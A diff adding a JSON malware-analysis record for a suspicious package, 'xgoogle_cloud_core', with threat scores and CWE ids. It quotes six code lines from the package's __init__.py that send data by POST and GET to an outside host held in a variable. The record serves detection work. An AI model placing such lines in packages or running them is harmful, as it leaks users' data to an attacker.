@@ -1,0 +1,52 @@
+{
+  "package_metadata": {
+    "name": "xgoogle_cloud_core",
+    "version": "1.4.3",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "http://%s/p",
+      "http://%s/g?d=%s"
+    ],
+    "process_spawns": []
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "xgoogle_cloud_core/__init__.py",
+        "code_snippet": "r = urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)\n"
+      },
+      {
+        "filename": "xgoogle_cloud_core/__init__.py",
+        "code_snippet": "r = urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\n"
+      },
+      {
+        "filename": "xgoogle_cloud_core/__init__.py",
+        "code_snippet": "r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\n"
+      },
+      {
+        "filename": "xgoogle_cloud_core/__init__.py",
+        "code_snippet": "r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\n"
+      },
+      {
+        "filename": "xgoogle_cloud_core/__init__.py",
+        "code_snippet": "r = urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)\n"
+      },
+      {
+        "filename": "xgoogle_cloud_core/__init__.py",
+        "code_snippet": "r = urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-319",
+      "CWE-532"
+    ]
+  }
+}
